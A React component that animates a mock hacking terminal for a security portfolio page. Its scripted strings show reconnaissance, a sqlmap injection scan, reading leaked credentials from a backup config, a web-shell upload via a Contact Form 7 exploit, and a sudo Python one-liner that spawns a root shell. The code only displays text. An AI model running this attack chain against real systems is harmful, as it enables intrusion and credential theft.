"use client"

import { useState, useEffect } from "react"
import { motion } from "framer-motion"
import { CyberCard } from "./cyber-card"

export function AnimatedTerminal() {
  const [terminalContent, setTerminalContent] = useState<JSX.Element[]>([])
  const [scanLinePosition, setScanLinePosition] = useState(0)
  const [glitchActive, setGlitchActive] = useState(false)
  const [exploitInProgress, setExploitInProgress] = useState(false)

  // Define all the terminal content
  const commands = [
    {
      command: "nmap -sV target.com",
      output: [
        "Starting Nmap 7.94 ( https://nmap.org )",
        "Scanning target.com (192.168.1.1) [1000 ports]",
        "Discovered open port 80/tcp on 192.168.1.1",
        "Discovered open port 443/tcp on 192.168.1.1",
        "Discovered open port 22/tcp on 192.168.1.1",
        "Service detection performed. Please report any incorrect results at https://nmap.org/submit/",
        "Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds",
      ],
      isExploit: false,
    },
    {
      command: "dirb https://target.com /usr/share/dirb/wordlists/common.txt",
      output: [
        "DIRB v2.22",
        "By The Dark Raver",
        "-----------------",
        "START_TIME: Wed Mar 23 14:42:36 2025",
        "URL_BASE: https://target.com/",
        "WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt",
        "---- Scanning URL: https://target.com/ ----",
        "+ https://target.com/admin (CODE:302|SIZE:0)",
        "+ https://target.com/api (CODE:200|SIZE:43)",
        "+ https://target.com/backup (CODE:403|SIZE:301)",
        "+ https://target.com/config (CODE:403|SIZE:301)",
      ],
      isExploit: false,
    },
    {
      command: "sqlmap -u 'https://target.com/page.php?id=1' --dbs --batch",
      output: [
        "sqlmap identified the following injection point(s):",
        "Parameter: id (GET)",
        "Type: boolean-based blind",
        "Title: AND boolean-based blind - WHERE or HAVING clause",
        "Payload: id=1 AND 5123=5123",
        "available databases [5]:",
        "[*] information_schema",
        "[*] mysql",
        "[*] performance_schema",
        "[*] sys",
        "[*] target_db",
      ],
      isExploit: false,
    },
    {
      command: "cd /backup && cat config.php.bak",
      output: [
        "<?php",
        "// Database configuration",
        "$db_host = 'localhost';",
        "$db_user = 'admin';",
        "$db_pass = 'P@ssw0rd123!';",
        "$db_name = 'target_db';",
        "// API Keys",
        "$aws_key = 'AKIA5EXAMPLE12345678';",
        "$aws_secret = 'abcDEF123+ExampleSecretKey456GHIjkl';",
        "?>",
      ],
      isExploit: true,
    },
    {
      command: "python3 exploit.py --target https://target.com/contact --vuln cf7-upload",
      output: [
        "[*] Contact Form 7 File Upload Exploit",
        "[*] CVE-2020-35489",
        "[*] Targeting: https://target.com/contact",
        "[*] Generating malicious payload...",
        "[*] Payload generated: shell.php",
        "[*] Sending payload...",
        "[+] Payload uploaded successfully!",
        "[+] Shell accessible at: https://target.com/wp-content/uploads/2023/08/shell.php",
        "[*] Establishing connection...",
        "[+] Connection established!",
      ],
      isExploit: true,
    },
    {
      command: "sudo -l",
      output: [
        "Matching Defaults entries for www-data on target:",
        "    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin",
        "",
        "User www-data may run the following commands on target:",
        "    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/backup/backup.py",
      ],
      isExploit: true,
    },
    {
      command: "echo 'import os; os.system(\"/bin/bash\")' > /tmp/exploit.py && sudo /usr/bin/python3 /tmp/exploit.py",
      output: [
        "root@target-web-01:/var/www/html# id",
        "uid=0(root) gid=0(root) groups=0(root)",
        "root@target-web-01:/var/www/html# cat /root/flag.txt",
        "FLAG{r00t_pwn3d_v1a_pyth0n_pr1v3sc}",
        "Congratulations on successfully exploiting this system!",
      ],
      isExploit: true,
    },
  ]

  // Scan line animation
  useEffect(() => {
    const scanInterval = setInterval(() => {
      setScanLinePosition((prev) => (prev + 1) % 100)
    }, 30)
    return () => clearInterval(scanInterval)
  }, [])

  // Random glitch effect
  useEffect(() => {
    const glitchInterval = setInterval(() => {
      if (Math.random() > 0.95) {
        setGlitchActive(true)
        setTimeout(() => setGlitchActive(false), 150)
      }
    }, 2000)
    return () => clearInterval(glitchInterval)
  }, [])

  // Simulate terminal activity
  useEffect(() => {
    // Start with empty terminal
    setTerminalContent([])

    // Process each command sequentially
    let currentCommandIndex = 0
    let overallDelay = 0

    const processNextCommand = () => {
      if (currentCommandIndex >= commands.length) {
        // Reset and start over after all commands
        setTimeout(() => {
          setTerminalContent([])
          currentCommandIndex = 0
          overallDelay = 0
          processNextCommand()
        }, 3000)
        return
      }

      const command = commands[currentCommandIndex]

      // Set exploit status
      setExploitInProgress(command.isExploit)

      // Add command to terminal
      setTimeout(() => {
        setTerminalContent((prev) => [
          ...prev,
          <div key={`cmd-${currentCommandIndex}`} className="flex mb-1">
            <span className="text-emerald-500 mr-2">$</span>
            <span className={command.isExploit ? "text-red-400" : ""}>{command.command}</span>
          </div>,
        ])

        // Add output lines with delays
        let lineDelay = 0
        command.output.forEach((line, lineIndex) => {
          lineDelay += Math.random() * 100 + 50
          setTimeout(() => {
            setTerminalContent((prev) => [
              ...prev,
              <div
                key={`out-${currentCommandIndex}-${lineIndex}`}
                className={`ml-4 text-gray-400 ${
                  command.isExploit && line.includes("FLAG{")
                    ? "text-yellow-400 font-bold"
                    : command.isExploit && (line.includes("root") || line.includes("success"))
                      ? "text-green-500"
                      : command.isExploit && (line.includes("error") || line.includes("failed"))
                        ? "text-red-500"
                        : ""
                }`}
              >
                {line}
              </div>,
            ])
          }, overallDelay + lineDelay)
        })

        // Move to next command after output is complete
        overallDelay += lineDelay + 1000
        setTimeout(() => {
          currentCommandIndex++
          processNextCommand()
        }, overallDelay)
      }, overallDelay)
    }

    // Start processing commands
    processNextCommand()

    // Cleanup function
    return () => {
      // Clear all timeouts
      const highestId = window.setTimeout(() => {}, 0)
      for (let i = 0; i < highestId; i++) {
        window.clearTimeout(i)
      }
    }
  }, [])

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      whileInView={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
      viewport={{ once: true }}
      className="container mx-auto px-4 py-8"
    >
      <div className="text-center mb-8">
        <div className="inline-block mb-4 px-4 py-1 border border-emerald-500/30 rounded-full bg-emerald-500/10 text-emerald-500 text-sm font-mono">
          SECURITY TOOLS
        </div>
        <h2 className="text-3xl font-bold mb-2">Bug Hunting Arsenal</h2>
        <p className="text-gray-400 max-w-2xl mx-auto font-mono">
          Tools and techniques used to discover and exploit vulnerabilities
        </p>
      </div>

      <CyberCard className="w-full max-w-4xl mx-auto">
        <div className="p-1">
          <div className="bg-gray-900 rounded-md relative overflow-hidden">
            {/* Terminal header */}
            <div className="flex items-center px-4 py-2 border-b border-gray-800">
              <div className="flex space-x-2">
                <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
                <div className="w-3 h-3 bg-green-500 rounded-full"></div>
              </div>
              <div className="mx-auto text-sm text-gray-400 font-mono">9am@security-terminal ~ </div>

              {/* Animated connection indicator */}
              <div className="flex items-center">
                <div
                  className={`w-2 h-2 rounded-full mr-1 ${exploitInProgress ? "bg-red-500 animate-pulse" : "bg-green-500"}`}
                ></div>
                <span className="text-xs text-gray-500 font-mono">{exploitInProgress ? "EXPLOIT" : "CONNECTED"}</span>
              </div>
            </div>

            {/* Scan line effect */}
            <div
              className="absolute left-0 right-0 h-[1px] bg-emerald-500/20 z-10 pointer-events-none"
              style={{ top: `${scanLinePosition}%` }}
            />

            {/* Glitch overlay */}
            {glitchActive && (
              <>
                <div
                  className="absolute inset-0 bg-red-500/5 z-10 pointer-events-none"
                  style={{ left: "-5px", clip: "rect(10px, 1000px, 20px, 0)" }}
                ></div>
                <div
                  className="absolute inset-0 bg-cyan-500/5 z-10 pointer-events-none"
                  style={{ left: "5px", clip: "rect(30px, 1000px, 50px, 0)" }}
                ></div>
              </>
            )}

            {/* Terminal content */}
            <div
              className="p-4 font-mono text-sm text-gray-300 h-[500px] overflow-y-auto relative"
              style={{ backgroundColor: "#0D1117" }}
            >
              {terminalContent}

              {/* Always show cursor at the end */}
              <div className="flex mt-2">
                <span className="text-emerald-500 mr-2">$</span>
                <span className="text-emerald-500 animate-pulse">▋</span>
              </div>
            </div>
          </div>
        </div>
      </CyberCard>
    </motion.div>
  )
}

